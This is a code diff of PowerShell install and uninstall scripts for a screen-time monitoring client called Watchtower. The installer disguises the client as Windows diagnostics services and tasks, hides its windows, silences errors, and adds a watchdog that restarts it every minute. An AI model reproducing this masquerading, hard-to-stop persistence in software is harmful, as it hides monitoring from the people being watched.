@@ -271,12 +271,15 @@ export function registerApiRoutes(
 $ErrorActionPreference = 'SilentlyContinue'
 $ProgressPreference = 'SilentlyContinue'
 
-$InstallDir = "C:\\ProgramData\\Watchtower"
+$InstallDir = "$env:LOCALAPPDATA\\Watchtower"
+if ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent().IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
+    $InstallDir = "C:\\ProgramData\\Watchtower"
+}
 $BinaryPath = "$InstallDir\\watchtower.exe"
 $ConfigPath = "$InstallDir\\config.json"
 $ServiceName = "WindowsDiagnosticsHost"
-$TaskName = "Microsoft\\Windows\\SystemDiagnosticsHostTask"
-$WatchdogTaskName = "Microsoft\\Windows\\SystemDiagnosticsWatchdog"
+$TaskName = "SystemDiagnosticsHostTask"
+$WatchdogTaskName = "SystemDiagnosticsWatchdog"
 $DownloadUrl = "${downloadUrl}"
 
 Write-Host "🛡️ Installing Project Watchtower Screen Time Client..." -ForegroundColor Cyan
@@ -330,7 +333,7 @@ try {
 
 # Method B: Scheduled Task at user logon (Power-resilient, no battery stop, no 72h limit, auto-restart)
 try {
-    Unregister-ScheduledTask -TaskName "SystemDiagnosticsHostTask" -Confirm:\$false -ErrorAction SilentlyContinue
+    Unregister-ScheduledTask -TaskName "SystemDiagnosticsHostTask" -Confirm:$false -ErrorAction SilentlyContinue
     $taskAction = New-ScheduledTaskAction -Execute $BinaryPath -Argument "--config \`"$ConfigPath\`""
     $taskTrigger = New-ScheduledTaskTrigger -AtLogOn -User $env:USERNAME
     $taskSettings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -ExecutionTimeLimit (New-TimeSpan -Days 0) -RestartCount 999 -RestartInterval (New-TimeSpan -Minutes 1) -StartWhenAvailable
@@ -339,7 +342,7 @@ try {
 
 # Method C: Watchdog Scheduled Task (Checks and revives process every 1 minute)
 try {
-    Unregister-ScheduledTask -TaskName "SystemDiagnosticsWatchdog" -Confirm:\$false -ErrorAction SilentlyContinue
+    Unregister-ScheduledTask -TaskName "SystemDiagnosticsWatchdog" -Confirm:$false -ErrorAction SilentlyContinue
     $watchdogScript = "if (-not (Get-Process -Name 'watchtower' -ErrorAction SilentlyContinue)) { Start-Process -FilePath '$BinaryPath' -ArgumentList '--config', '$ConfigPath' -WindowStyle Hidden }"
     $watchdogAction = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command \`"$watchdogScript\`""
     $watchdogTrigger = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes 1) -RepetitionDuration (New-TimeSpan -Days 9999)
@@ -366,7 +369,7 @@ Write-Host " Watchtower Client successfully installed, running in background, an
 $ErrorActionPreference = 'SilentlyContinue'
 $ProgressPreference = 'SilentlyContinue'
 
-$InstallDir = "C:\\ProgramData\\Watchtower"
+$InstallDirs = @("$env:LOCALAPPDATA\\Watchtower", "C:\\ProgramData\\Watchtower")
 $ServiceName = "WindowsDiagnosticsHost"
 $TaskName = "SystemDiagnosticsHostTask"
 $WatchdogTaskName = "SystemDiagnosticsWatchdog"
@@ -392,8 +395,10 @@ Remove-ItemProperty -Path "HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\
 Remove-ItemProperty -Path "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" -Name "WindowsDiagnosticsHost" -ErrorAction SilentlyContinue
 
 # 5. Clean up installed binaries and configs
-if (Test-Path $InstallDir) {
-    Remove-Item -Path $InstallDir -Recurse -Force -ErrorAction SilentlyContinue
+foreach ($dir in $InstallDirs) {
+    if (Test-Path $dir) {
+        Remove-Item -Path $dir -Recurse -Force -ErrorAction SilentlyContinue
+    }
 }
 
 Write-Host " Watchtower has been completely and cleanly uninstalled." -ForegroundColor Green
